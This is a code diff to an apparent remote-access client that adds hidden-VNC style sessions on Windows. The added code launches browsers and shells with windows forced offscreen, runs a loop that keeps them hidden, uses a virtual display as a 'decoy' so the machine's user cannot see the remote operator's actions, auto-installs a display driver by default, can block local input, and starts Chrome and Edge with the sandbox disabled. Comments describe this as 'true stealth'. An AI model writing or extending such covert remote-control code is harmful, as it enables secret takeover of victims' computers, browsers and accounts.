@@ -24,21 +24,44 @@ from aiortc import MediaStreamTrack
 from aiortc.mediastreams import MediaStreamError, VIDEO_CLOCK_RATE, VIDEO_TIME_BASE
 from av.video.frame import VideoFrame
 
-from remote_client.control.input_controller import (
-    _SendInputFallback,
-    ControlCommand,
-    MouseClick,
-    MouseDown,
-    MouseMove,
-    MouseScroll,
-    MouseUp,
-    KeyDown,
-    KeyPress,
-    KeyUp,
-    TextInput,
-)
-from remote_client.apps.launcher import resolve_app_executable
-from remote_client.media.stream_profiles import AdaptiveStreamProfile
+try:
+    from remote_client.control.input_controller import (
+        _SendInputFallback,
+        ControlCommand,
+        MouseClick,
+        MouseDown,
+        MouseMove,
+        MouseScroll,
+        MouseUp,
+        KeyDown,
+        KeyPress,
+        KeyUp,
+        TextInput,
+    )
+except ImportError:
+    from ..control.input_controller import (
+        _SendInputFallback,
+        ControlCommand,
+        MouseClick,
+        MouseDown,
+        MouseMove,
+        MouseScroll,
+        MouseUp,
+        KeyDown,
+        KeyPress,
+        KeyUp,
+        TextInput,
+    )
+
+try:
+    from remote_client.apps.launcher import resolve_app_executable
+except ImportError:
+    from ..apps.launcher import resolve_app_executable
+
+try:
+    from remote_client.media.stream_profiles import AdaptiveStreamProfile
+except ImportError:
+    from ..media.stream_profiles import AdaptiveStreamProfile
 
 logger = logging.getLogger(__name__)
 
@@ -50,8 +73,15 @@ try:
     )
     VIRTUAL_DISPLAY_AVAILABLE = True
 except ImportError:
-    VIRTUAL_DISPLAY_AVAILABLE = False
-    VirtualDisplaySession = None
+    try:
+        from .virtual_display import (
+            VirtualDisplaySession,
+            check_virtual_display_support,
+        )
+        VIRTUAL_DISPLAY_AVAILABLE = True
+    except ImportError:
+        VIRTUAL_DISPLAY_AVAILABLE = False
+        VirtualDisplaySession = None
 
 if platform.system() == "Windows":
     from ctypes import wintypes
@@ -121,13 +151,14 @@ if platform.system() == "Windows":
             ("bInheritHandle", wintypes.BOOL),
         ]
 
+    # Note: Using LPVOID for lpsa parameter to allow passing ctypes.byref() or None
     user32.CreateDesktopW.argtypes = [
         wintypes.LPCWSTR,
         wintypes.LPCWSTR,
         wintypes.LPVOID,
         wintypes.DWORD,
         wintypes.DWORD,
-        ctypes.POINTER(SECURITY_ATTRIBUTES),
+        wintypes.LPVOID,  # LPSECURITY_ATTRIBUTES - use LPVOID for compatibility with byref()
     ]
     user32.CreateDesktopW.restype = wintypes.HANDLE
     user32.CloseDesktop.argtypes = [wintypes.HANDLE]
@@ -150,6 +181,14 @@ if platform.system() == "Windows":
     user32.ReleaseDC.restype = wintypes.INT
     user32.GetSystemMetrics.argtypes = [wintypes.INT]
     user32.GetSystemMetrics.restype = wintypes.INT
+    user32.GetWindowThreadProcessId.argtypes = [wintypes.HWND, ctypes.POINTER(wintypes.DWORD)]
+    user32.GetWindowThreadProcessId.restype = wintypes.DWORD
+    user32.EnumWindows.argtypes = [ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM), wintypes.LPARAM]
+    user32.EnumWindows.restype = wintypes.BOOL
+    user32.IsWindowVisible.argtypes = [wintypes.HWND]
+    user32.IsWindowVisible.restype = wintypes.BOOL
+    user32.SetWindowPos.argtypes = [wintypes.HWND, wintypes.HWND, wintypes.INT, wintypes.INT, wintypes.INT, wintypes.INT, wintypes.UINT]
+    user32.SetWindowPos.restype = wintypes.BOOL
 
     gdi32.CreateCompatibleDC.argtypes = [wintypes.HDC]
     gdi32.CreateCompatibleDC.restype = wintypes.HDC
@@ -719,14 +758,15 @@ class HiddenDesktopSession:
         if self._use_virtual_display:
             self._virtual_display_active = self._init_virtual_display()
             if self._virtual_display_active and self._virtual_display:
-                monitor_region = self._virtual_display.get_capture_region()
+                # Virtual display is active - it hides what client sees
+                # But we ALWAYS capture from PRIMARY monitor (index 1) where apps run
+                # Virtual display is just a decoy/dummy monitor
                 logger.info(
-                    "Hidden desktop: using virtual display for capture at (%d, %d) size %dx%d",
-                    monitor_region.get("left", 0),
-                    monitor_region.get("top", 0),
-                    monitor_region.get("width", 0),
-                    monitor_region.get("height", 0),
+                    "Hidden desktop: virtual display active (hiding client view), "
+                    "capturing from PRIMARY monitor"
                 )
+                monitor_index = 1  # Primary monitor
+                monitor_region = None  # Let mss select primary monitor
             else:
                 logger.info("Hidden desktop: virtual display not available, using primary monitor")
         
@@ -749,6 +789,12 @@ class HiddenDesktopSession:
         self.screen_track = HiddenDesktopTrack(self._capture, profile="balanced")
         self.input_controller = HiddenDesktopInputController(self._desktop_handle, size)
         
+        # Log operating mode
+        if self._virtual_display_active:
+            logger.info("Using virtual display mode (client view hidden, capturing primary monitor)")
+        else:
+            logger.info("Using fallback mode (client can see actions)")
+        
         if self._block_local_input:
             self.block_local_input()
     
@@ -757,10 +803,15 @@ class HiddenDesktopSession:
         if not VIRTUAL_DISPLAY_AVAILABLE or VirtualDisplaySession is None:
             return False
         
+        # Check if auto-install is enabled via environment variable
+        auto_install = os.getenv("RC_VDD_AUTO_INSTALL", "1").strip().lower() in {
+            "1", "true", "yes", "on"
+        }
+        
         try:
             self._virtual_display = VirtualDisplaySession()
             # Try to start with 1920x1080 resolution
-            if self._virtual_display.start(width=1920, height=1080, auto_install=False):
+            if self._virtual_display.start(width=1920, height=1080, auto_install=auto_install):
                 logger.info("Virtual display started: %dx%d", 
                             *self._virtual_display.resolution)
                 return True
@@ -855,9 +906,17 @@ try:
     )
     PRINTWINDOW_AVAILABLE = True
 except ImportError:
-    PRINTWINDOW_AVAILABLE = False
-    WindowCaptureSession = None
-    WindowInputController = None
+    try:
+        from .window_capture import (
+            WindowCaptureSession,
+            WindowInputController,
+            WindowInfo,
+        )
+        PRINTWINDOW_AVAILABLE = True
+    except ImportError:
+        PRINTWINDOW_AVAILABLE = False
+        WindowCaptureSession = None
+        WindowInputController = None
 
 
 class PrintWindowCapture:
@@ -1067,23 +1126,29 @@ class PrintWindowInputController:
 
 
 class HiddenWindowSession:
-    """Hidden window session using PrintWindow API.
+    """Hidden window session using PrintWindow API with offscreen windows.
     
-    This mode captures windows directly using PrintWindow API, compositing
-    them into a single frame. No driver installation required.
+    This mode runs applications on the MAIN desktop but moves their windows
+    offscreen (x=-10000) so the client cannot see them. PrintWindow API
+    can capture offscreen windows perfectly.
     
     Advantages:
     - No driver installation
-    - True stealth - client sees nothing
+    - True stealth - windows are offscreen, invisible to client
     - Works with any Windows version
+    - GPU renders windows properly (unlike hidden desktop)
     
     How it works:
-    1. Creates a hidden Windows Desktop
-    2. Launches applications on that desktop
+    1. Launches applications on main desktop with window position offscreen
+    2. Monitors and moves any new windows offscreen
     3. Captures window contents via PrintWindow API
     4. Composites windows into a single frame
-    5. Sends input via PostMessage to target windows
+    5. Sends input via SendInput (works globally)
     """
+    
+    # Offscreen position - far left of screen
+    OFFSCREEN_X = -10000
+    OFFSCREEN_Y = 0
     
     def __init__(self, width: int = 1920, height: int = 1080, fps: int = 30) -> None:
         if platform.system() != "Windows":
@@ -1096,11 +1161,15 @@ class HiddenWindowSession:
         self._height = height
         self._fps = fps
         
-        self._desktop_name = f"rc_hidden_{uuid.uuid4().hex}"
-        self._desktop_handle = _create_desktop(self._desktop_name)
-        self._desktop_path = f"WinSta0\\{self._desktop_name}"
+        # Track windows we've launched
+        self._our_pids: set[int] = set()
+        self._our_hwnds: set[int] = set()
         self._processes: list[subprocess.Popen] = []
         self._input_blocked = False
+        
+        # No separate desktop - use main desktop
+        self._desktop_handle = None
+        self._desktop_path = None
         
         self._block_local_input = os.getenv("RC_BLOCK_LOCAL_INPUT", "").strip().lower() in {
             "1",
@@ -1109,16 +1178,17 @@ class HiddenWindowSession:
             "on",
         }
         
-        # Start shell on hidden desktop
-        self._start_shell()
-        
-        # Initialize PrintWindow capture
+        # Initialize PrintWindow capture (no desktop handle = main desktop)
         self._capture = PrintWindowCapture(
-            desktop_handle=self._desktop_handle,
+            desktop_handle=None,  # Main desktop
             fps=fps,
             width=width,
             height=height,
         )
+        
+        # Don't filter windows initially - capture all visible windows
+        # Once we launch apps, we'll filter to only our windows
+        # self._capture._session._our_hwnds stays None = capture all
         
         # Wait for capture to initialize
         size = self._capture.frame_size
@@ -1130,62 +1200,153 @@ class HiddenWindowSession:
         # Create track for WebRTC
         self.screen_track = HiddenDesktopTrack(self._capture, profile="balanced")
         
-        # Create input controller
+        # Create input controller (uses SendInput on main desktop)
         self.input_controller = PrintWindowInputController(
-            self._desktop_handle,
+            None,  # No desktop handle
             self._capture,
-            size,
+            (width, height),
         )
+        
+        # Start window monitor thread
+        self._stop_monitor = threading.Event()
+        self._monitor_thread = threading.Thread(target=self._window_monitor_loop, daemon=True)
+        self._monitor_thread.start()
         
         if self._block_local_input:
             self.block_local_input()
         
-        logger.info("HiddenWindowSession started (PrintWindow mode)")
+        logger.info("HiddenWindowSession started (PrintWindow offscreen mode)")
     
-    def _start_shell(self) -> None:
-        """Start explorer and cmd on hidden desktop."""
-        startupinfo = subprocess.STARTUPINFO()
-        startupinfo.lpDesktop = self._desktop_path
-        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-        startupinfo.wShowWindow = subprocess.SW_HIDE
-        
-        for cmd in ("explorer.exe", "cmd.exe"):
+    def _window_monitor_loop(self) -> None:
+        """Monitor and move our windows offscreen."""
+        while not self._stop_monitor.is_set():
             try:
-                proc = subprocess.Popen([cmd], startupinfo=startupinfo)
-                self._processes.append(proc)
+                self._move_our_windows_offscreen()
             except Exception as exc:
-                logger.warning("Failed to start %s on hidden desktop: %s", cmd, exc)
+                logger.debug("Window monitor error: %s", exc)
+            self._stop_monitor.wait(0.5)
+    
+    def _move_our_windows_offscreen(self) -> None:
+        """Find and move all windows belonging to our processes offscreen."""
+        if not self._our_pids:
+            return
         
-        # Give explorer time to initialize
-        time.sleep(1.0)
+        @ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
+        def enum_callback(hwnd: int, lparam: int) -> bool:
+            try:
+                # Get window's process ID
+                pid = wintypes.DWORD()
+                user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
+                
+                if pid.value in self._our_pids:
+                    # Check if window is visible
+                    if user32.IsWindowVisible(hwnd):
+                        # Get current position
+                        rect = RECT()
+                        user32.GetWindowRect(hwnd, ctypes.byref(rect))
+                        
+                        # If not already offscreen, move it
+                        if rect.left > self.OFFSCREEN_X + 100:
+                            width = rect.right - rect.left
+                            height = rect.bottom - rect.top
+                            
+                            # Move window offscreen
+                            SWP_NOSIZE = 0x0001
+                            SWP_NOZORDER = 0x0004
+                            SWP_NOACTIVATE = 0x0010
+                            SWP_SHOWWINDOW = 0x0040
+                            
+                            user32.SetWindowPos(
+                                hwnd,
+                                0,  # HWND_TOP
+                                self.OFFSCREEN_X,
+                                self.OFFSCREEN_Y,
+                                width,
+                                height,
+                                SWP_NOZORDER | SWP_NOACTIVATE | SWP_SHOWWINDOW
+                            )
+                            
+                            # Track this hwnd
+                            self._our_hwnds.add(hwnd)
+                            logger.debug("Moved window %d (PID %d) offscreen", hwnd, pid.value)
+            except Exception:
+                pass
+            return True
+        
+        user32.EnumWindows(enum_callback, 0)
     
     def launch_application(self, app_name: str, url: str | None = None) -> None:
-        """Launch an application on the hidden desktop.
+        """Launch an application and move its window offscreen.
         
         Args:
             app_name: Application name (chrome, firefox, etc.) or full path
             url: Optional URL to open (for browsers)
+        
+        Supported applications:
+            - chrome, chromium: --no-sandbox --disable-gpu
+            - firefox: runs normally
+            - edge: --no-sandbox --disable-gpu
+            - powershell, pwsh: runs with window
+            - cmd: runs with window
         """
         exe = _resolve_app_executable(app_name)
         if not exe:
             raise FileNotFoundError(f"Application not found: {app_name}")
         
+        # Normal startupinfo
         startupinfo = subprocess.STARTUPINFO()
-        startupinfo.lpDesktop = self._desktop_path
         startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-        startupinfo.wShowWindow = 5  # SW_SHOW - need visible for PrintWindow
+        startupinfo.wShowWindow = 5  # SW_SHOW - window must be visible for PrintWindow
         
+        app_lower = app_name.lower()
         cmd = [exe]
+        
+        # Add application-specific flags
+        if any(b in app_lower for b in ("chrome", "chromium")):
+            cmd.extend([
+                "--no-sandbox",
+                "--disable-gpu",
+                "--disable-software-rasterizer",
+                "--disable-dev-shm-usage",
+                "--no-first-run",
+                "--no-default-browser-check",
+                f"--window-position={self.OFFSCREEN_X},{self.OFFSCREEN_Y}",
+                f"--window-size={self._width},{self._height}",
+            ])
+        elif "edge" in app_lower:
+            cmd.extend([
+                "--no-sandbox",
+                "--disable-gpu",
+                "--disable-software-rasterizer",
+                "--no-first-run",
+                f"--window-position={self.OFFSCREEN_X},{self.OFFSCREEN_Y}",
+                f"--window-size={self._width},{self._height}",
+            ])
+        elif "firefox" in app_lower:
+            # Firefox doesn't have window-position flag, we'll move it via API
+            pass
+        
         if url:
             cmd.append(url)
         
-        proc = subprocess.Popen(cmd, startupinfo=startupinfo)
-        self._processes.append(proc)
-        
-        # Give app time to create window
-        time.sleep(1.0)
-        
-        logger.info("Launched %s on hidden desktop (PID: %d)", app_name, proc.pid)
+        try:
+            proc = subprocess.Popen(cmd, startupinfo=startupinfo)
+            self._processes.append(proc)
+            self._our_pids.add(proc.pid)
+            
+            # Wait for window to appear and move it offscreen
+            time.sleep(1.5)
+            self._move_our_windows_offscreen()
+            
+            # Now that we have windows, enable filtering to only capture our windows
+            if self._our_hwnds:
+                self._capture._session._our_hwnds = self._our_hwnds
+                logger.debug("Enabled window filtering, tracking %d windows", len(self._our_hwnds))
+            
+            logger.info("Launched %s offscreen (PID: %d), cmd: %s", app_name, proc.pid, " ".join(cmd[:3]))
+        except Exception as exc:
+            logger.error("Failed to launch %s: %s", app_name, exc)
+            raise
     
     def get_windows(self) -> list:
         """Get list of tracked windows."""
@@ -1220,6 +1381,11 @@ class HiddenWindowSession:
         """Clean up session resources."""
         logger.info("Closing HiddenWindowSession")
         
+        # Stop window monitor
+        self._stop_monitor.set()
+        if self._monitor_thread.is_alive():
+            self._monitor_thread.join(timeout=1.0)
+        
         self.screen_track.stop()
         self.input_controller.close()
         self.unblock_local_input()
@@ -1231,29 +1397,44 @@ class HiddenWindowSession:
             except Exception:
                 pass
         self._processes.clear()
+        self._our_pids.clear()
+        self._our_hwnds.clear()
         
         # Close capture
         self._capture.close()
-        
-        # Close desktop
-        _close_desktop(self._desktop_handle)
-        self._desktop_handle = None
 
 
 def create_hidden_session(mode: str = "auto", **kwargs):
     """Factory function to create appropriate hidden session.
     
     Args:
-        mode: Session mode - "auto", "printwindow", "virtual_display", or "fallback"
+        mode: Session mode - "auto", "hvnc", "printwindow", "virtual_display", or "fallback"
         **kwargs: Additional arguments passed to session constructor
     
     Returns:
-        Session instance (HiddenWindowSession or HiddenDesktopSession)
+        Session instance (HVNCSessionWrapper, HiddenWindowSession, or HiddenDesktopSession)
     
-    Note:
-        PrintWindow mode only works when explicitly requested, as it requires
-        windows to be on the same desktop for capture to work correctly.
+    Modes:
+        - "auto": Try hVNC first (true hidden desktop), then PrintWindow, then virtual display
+        - "hvnc": Use CreateDesktop API for true hidden desktop (recommended)
+        - "printwindow": Use PrintWindow API with offscreen windows
+        - "virtual_display": Use VDD driver (requires installation)
+        - "fallback": Capture from primary monitor (client sees actions)
     """
+    # Try to import hVNC
+    hvnc_available = False
+    try:
+        from .hvnc_track import HVNCSessionWrapper, HVNC_AVAILABLE
+        hvnc_available = HVNC_AVAILABLE
+    except ImportError:
+        pass
+    
+    if mode == "hvnc":
+        if not hvnc_available:
+            raise RuntimeError("hVNC mode not available")
+        from .hvnc_track import HVNCSessionWrapper
+        return HVNCSessionWrapper(**kwargs)
+    
     if mode == "printwindow":
         if not PRINTWINDOW_AVAILABLE:
             raise RuntimeError("PrintWindow mode not available")
@@ -1265,10 +1446,28 @@ def create_hidden_session(mode: str = "auto", **kwargs):
     if mode == "fallback":
         return HiddenDesktopSession(use_virtual_display=False, **kwargs)
     
-    # Auto mode: try virtual display first, then fallback
-    # PrintWindow is NOT used in auto mode because it cannot capture 
-    # windows from a different desktop
+    # Auto mode: try hVNC first, then PrintWindow, then virtual display
     if mode == "auto":
+        # First try hVNC mode - true hidden desktop, no driver required
+        if hvnc_available:
+            try:
+                from .hvnc_track import HVNCSessionWrapper
+                session = HVNCSessionWrapper(**kwargs)
+                logger.info("Using hVNC mode (CreateDesktop hidden desktop)")
+                return session
+            except Exception as exc:
+                logger.warning("hVNC session failed: %s, trying PrintWindow", exc)
+        
+        # Second try PrintWindow mode - no driver required
+        if PRINTWINDOW_AVAILABLE:
+            try:
+                session = HiddenWindowSession(**kwargs)
+                logger.info("Using PrintWindow mode (offscreen windows)")
+                return session
+            except Exception as exc:
+                logger.warning("PrintWindow session failed: %s, trying virtual display", exc)
+        
+        # Fallback to virtual display / fallback mode
         try:
             session = HiddenDesktopSession(use_virtual_display=True, **kwargs)
             if session.is_virtual_display_active:
